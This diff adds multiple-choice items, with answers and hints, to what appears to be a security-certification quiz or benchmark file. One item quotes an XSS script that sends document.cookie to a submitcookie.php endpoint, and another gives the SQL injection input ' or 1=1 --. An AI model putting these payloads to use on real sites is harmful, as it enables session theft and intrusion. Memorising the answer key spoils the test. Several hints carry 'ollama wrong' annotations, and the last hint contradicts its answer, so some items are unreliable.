@@ -7379,5 +7379,247 @@
       "DNS cache snooping",
       "DNS tunneling method"
     ]
+  },
+  {
+    "question": "Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of applications, he follows the five-tier container technology architecture. Currently, Abel is verifying and validating image contents, signing images, and sending them to the registries.  Which of the following tiers of the container technology architecture is Abel currently working in?",
+    "answer": "Tier-2: Testing and accreditation systems",
+    "hint": "Abel is working with image contents and registries. ollama wrong Tier-3: Registries",
+    "options": [
+      "Tier-1: Developer machines",
+      "Tier-2: Testing and accreditation systems",
+      "Tier-4: Orchestrators",
+      "Tier-3: Registries"
+    ]
+  },
+  {
+    "question": "Taylor, a security professional, uses a tool to monitor her company’s website, analyze the website’s traffic, and track the geographical location of the users visiting the company’s website.  Which of the following tools did Taylor employ in the above scenario?",
+    "answer": "Web-stat",
+    "hint": "Monitoring and analyzing website traffic",
+    "options": [
+      "WAFW00F",
+      "Webroot",
+      "Web-stat",
+      "WebSite-Watcher"
+    ]
+  },
+  {
+    "question": "Attacker Rony installed a rogue access point within an organization’s perimeter and attempted to intrude into its internal network. Johnson, a security auditor, identified some unusual traffic in the internal network that is aimed at cracking the authentication mechanism. He immediately turned off the targeted network and tested for any weak and outdated security mechanisms that are open to attack.  What is the type of vulnerability assessment performed by Johnson in the above scenario?",
+    "answer": "Wireless network assessment",
+    "hint": "Focus on 'rogue access point' and unusual traffic",
+    "options": [
+      "Wireless network assessment",
+      "Distributed assessment",
+      "Application assessment",
+      "Host-based assessment"
+    ]
+  },
+  {
+    "question": "You start performing a penetration test against a specific website and have decided to start from grabbing all the links from the main page.  What is the best Linux pipe to achieve your milestone?",
+    "answer": "curl -s https://site.com | grep “<a href=\\“http” | grep “site.com” | cut -d “\\”” -f 2",
+    "hint": "curl retrieves the page content silently while subsequent commands extract and filter URLs.",
+    "options": [
+      "wget https://site.com | cut -d “http”",
+      "wget https://site.com | grep “<a href=\\“http” | grep “site.com”",
+      "curl -s https://site.com | grep “<a href=\\“http” | grep “site.com” | cut -d “\\”” -f 2",
+      "dirb https://site.com | grep “site”"
+    ]
+  },
+  {
+    "question": "Joe works as an IT administrator in an organization and has recently set up a cloud computing service for the organization. To implement this service, he reached out to a telecom company for providing Internet connectivity and transport services between the organization and the cloud service provider.  In the NIST cloud deployment reference architecture, under which category does the telecom company fall in the above scenario?",
+    "answer": "cloud carrier",
+    "hint": "The telecom provides connectivity and transport services.",
+    "options": [
+      "Cloud consumer",
+      "cloud carrier",
+      "cloud broker",
+      "cloud auditor"
+    ]
+  },
+  {
+    "question": "A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the Equifax data breach that affected 143 million customers. A fix was available from the software vendor for several months prior to the intrusion. This is likely a failure in which of the following security processes?",
+    "answer": "Patch management",
+    "hint": "The breach was due to an unpatched vulnerability.",
+    "options": [
+      "Secure development lifecycle",
+      "Security awareness training",
+      "Patch management",
+      "Vendor risk management"
+    ]
+  },
+  {
+    "question": "Don, a student, came across a gaming app in a third-party app store and installed it. Subsequently, all the legitimate apps in his smartphone were replaced by deceptive applications that appeared legitimate. He also received many advertisements on his smartphone after installing the app.  What is the attack performed on Don in the above scenario?",
+    "answer": "Agent Smith attack",
+    "hint": "This malware replaces legitimate apps with fake ones.",
+    "options": [
+      "SIM card attack",
+      "Agent Smith attack",
+      "SMS phishing attack",
+      "Clickjacking"
+    ]
+  },
+  {
+    "question": "This form of encryption algorithm is a symmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?",
+    "answer": "Twofish encryption algorithm",
+    "hint": "This option refers to a symmetric key block cipher with the specified characteristics.",
+    "options": [
+      "Twofish encryption algorithm",
+      "Blowfish encryption algorithm",
+      "HMAC encryption algorithm",
+      "IDEA"
+    ]
+  },
+  {
+    "question": "Ethical hacker Jane Smith is attempting to perform an SQL injection attack. She wants to test the response time of a true or false response and wants to use a second command to determine whether the database will return true or false results for user IDs.  Which two SQL injection types would give her the results she is looking for?",
+    "answer": "Time-based and boolean-based",
+    "hint": "Use types that can determine true or false results.",
+    "options": [
+      "Out of band and boolean-based",
+      "Union-based and error-based",
+      "Time-based and union-based",
+      "Time-based and boolean-based"
+    ]
+  },
+  {
+    "question": "Judy created a forum. One day, she discovers that a user is posting strange images without writing comments. She immediately calls a security expert, who discovers that the following code is hidden behind those images: <script> document.write('<img.src=\"https://localhost/submitcookie.php? cookie = ' +escape (document.cookie)+\"' />) </script>  What issue occurred for the users who clicked on the image?",
+    "answer": "This php file silently executes the code and grabs the user’s session cookie and session ID.",
+    "hint": "This php file silently executes the code and grabs the user’s session cookie and session ID.",
+    "options": [
+      "The code injects a new cookie to the browser.",
+      "The code redirects the user to another site.",
+      "This php file silently executes the code and grabs the user’s session cookie and session ID.",
+      "The code is a virus that is attempting to gather the user’s username and password."
+    ]
+  },
+  {
+    "question": "Suppose that you test an application for the SQL injection vulnerability. You know that the backend database is based on Microsoft SQL Server. In the login/password form, you enter the following credentials:  Username:  attack ' or 1=1 -- Password: 123456 Based on the above credentials, which of the following SQL commands are you expecting to be executed by the server, if there is indeed an SQL injection vulnerability?",
+    "answer": "select * from Users where UserName = ‘attack’ or 1=1 --’ and UserPassword = ‘123456’",
+    "hint": "This option correctly places the closing single quote after 'or 1=1'.",
+    "options": [
+      "select * from Users where UserName = ‘attack’ ’ or 1=1 -- and UserPassword = ‘123456’",
+      "select * from Users where UserName = ‘attack’ or 1=1 --’ and UserPassword = ‘123456’",
+      "select * from Users where UserName = ‘attack or 1=1 -- and UserPassword = ‘123456’",
+      "select * from Users where UserName = ‘attack’ or 1=1 -- and UserPassword = ‘123456’"
+    ]
+  },
+  {
+    "question": "A friend of yours tells you that he downloaded and executed a file that was sent to him by a coworker. Since the file did nothing when executed, he asks you for help because he suspects that he may have installed a trojan on his computer.  What tests would you perform to determine whether his computer is infected?",
+    "answer": "Upload the file to VirusTotal.",
+    "hint": "Uploading suspicious files to VirusTotal can help identify known malware.",
+    "options": [
+      "Use ExifTool and check for malicious content.",
+      "Upload the file to VirusTotal.",
+      "You do not check; rather, you immediately restore a previous snapshot of the operating system.",
+      "Use netstat and check for outgoing connections to strange IP addresses or domains."
+    ]
+  },
+  {
+    "question": "An attacker redirects the victim to malicious websites by sending them a malicious link by email. The link appears authentic but redirects the victim to a malicious web page, which allows the attacker to steal the victim’s data. What type of attack is this?",
+    "answer": "phising",
+    "hint": "This technique often involves tricking users into providing sensitive information.",
+    "options": [
+      "Ddos",
+      "Spoofing",
+      "phising",
+      "vishing"
+    ]
+  },
+  {
+    "question": "A DDoS attack is performed at layer 7 to take down web infrastructure. Partial HTTP requests are sent to the web infrastructure or applications. Upon receiving a partial requestA DDoS attack is performed at layer 7 to take down web infrastructure. Partial HTTP requests are sent to the web infrastructure or applications. Upon receiving a partial request, the target servers opens multiple connections and keeps waiting for the requests to complete.  Which attack is being described here?",
+    "answer": "Slowloris attack",
+    "hint": "This type of DDoS attack uses partial HTTP requests to overwhelm servers.",
+    "options": [
+      "Slowloris attack",
+      "Session splicing",
+      "Desynchronization",
+      "Phlashing"
+    ]
+  },
+  {
+    "question": "Boney, a professional hacker, targets an organization for financial benefits. He performs an attack by sending his session ID using an MITM attack technique. Boney first obtains a valid session ID by logging into a service and later feeds the same session ID to the target employee. The session ID links the target employee to Boney’s account page without disclosing any information to the victim. When the target employee clicks on the link, all the sensitive payment details entered in a form are linked to Boney’s account.  What is the attack performed by Boney in the above scenario?",
+    "answer": "Session fixation attack",
+    "hint": "The session ID is fixed and reused to hijack the target employee's actions.",
+    "options": [
+      "Session donation attack",
+      "Forbidden attack",
+      "CRIME attack",
+      "Session fixation attack"
+    ]
+  },
+  {
+    "question": "Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application.  What is the type of web-service API mentioned in the above scenario?",
+    "answer": "RESTful API",
+    "hint": "Uses HTTP methods such as PUT, POST, GET, and DELETE ollama wrong REST API",
+    "options": [
+      "REST API",
+      "JSON-RPC",
+      "SOAP API",
+      "RESTful API"
+    ]
+  },
+  {
+    "question": "Daniel is a professional hacker who is attempting to perform an SQL injection attack on a target website, www.moviescope.com. During this process, he encountered an IDS that detects SQL injection attempts based on predefined signatures. To evade any comparison statement, he attempted placing characters such as “’or ‘1’=‘1’” in any basic injection statement such as “or 1=1.”  Identify the evasion technique used by Daniel in the above scenario.",
+    "answer": "Variation",
+    "hint": "The hint is that he modified the injection statement.",
+    "options": [
+      "Null byte",
+      "IP fragmentation",
+      "Char encoding",
+      "Variation"
+    ]
+  },
+  {
+    "question": "Jane, an ethical hacker, is testing a target organization’s web server and website to identify security loopholes. In this process, she copied the entire website and its content on a local drive to view the complete profile of the site’s directory structure, file structure, external links, images, web pages, and so on. This information helps Jane map the website’s directories and gain valuable information.  What is the attack technique employed by Jane in the above scenario?",
+    "answer": "Website mirroring",
+    "hint": "Technique involves copying a website for analysis",
+    "options": [
+      "Session hijacking",
+      "Web cache poisoning",
+      "Website mirroring",
+      "Website defacement"
+    ]
+  },
+  {
+    "question": "Steve, an attacker, created a fake profile on a social media website and sent a request to Stella. Stella was enthralled by Steve’s profile picture and the description given for his profile, and she initiated a conversation with him soon after accepting the request. After a few days, Steve started asking about her company details and eventually gathered all the essential information regarding her company.  What is the social engineering technique Steve employed in the above scenario?",
+    "answer": "Honey trap",
+    "hint": "Steve used his profile to attract Stella.",
+    "options": [
+      "Honey trap",
+      "Baiting",
+      "Diversion theft",
+      "Piggybacking"
+    ]
+  },
+  {
+    "question": "Alice needs to send a confidential document to her coworker, Bryan. Their company has public key infrastructure set up. Therefore, Alice both encrypts the message and digitally signs it. Alice uses _______________ to encrypt the message, and Bryan uses _______________ to confirm the digital signature.",
+    "answer": "Bryan’s public key; Alice’s public key",
+    "hint": "Encryption uses the recipient's public key and signature verification uses sender's public key.",
+    "options": [
+      "Bryan’s public key; Alice’s public key",
+      "Bryan’s private key; Alice’s public key",
+      "Alice’s private key; Alice’s public key",
+      "Bryan’s public key; Bryan’s public key"
+    ]
+  },
+  {
+    "question": "Samuel, a professional hacker, monitored and intercepted already established traffic between Bob and a host machine to predict Bob’s ISN. Using this ISN, Samuel sent spoofed packets with Bob’s IP address to the host machine. The host machine responded with a packet having an incremented ISN. Consequently, Bob’s connection got hung, and Samuel was able to communicate with the host machine on behalf of Bob.  What is the type of attack performed by Samuel in the above scenario?",
+    "answer": "TCP/IP hijacking",
+    "hint": "Samuel intercepted and used Bob's ISN to spoof packets.",
+    "options": [
+      "Forbidden attack",
+      "TCP/IP hijacking",
+      "Blind hijacking",
+      "UDP hijacking"
+    ]
+  },
+  {
+    "question": "If you send a TCP ACK segment to a known closed port on a firewall but it does not respond with an RST, what do you know about the firewall you are scanning?",
+    "answer": "This event does not tell you anything about the firewall.",
+    "hint": "Non-stateful firewalls do not track connection states. ollama wrong It is a non-stateful firewall.",
+    "options": [
+      "It is a stateful firewall.",
+      "There is no firewall in place.",
+      "It is a non-stateful firewall.",
+      "This event does not tell you anything about the firewall."
+    ]
   }
 ]
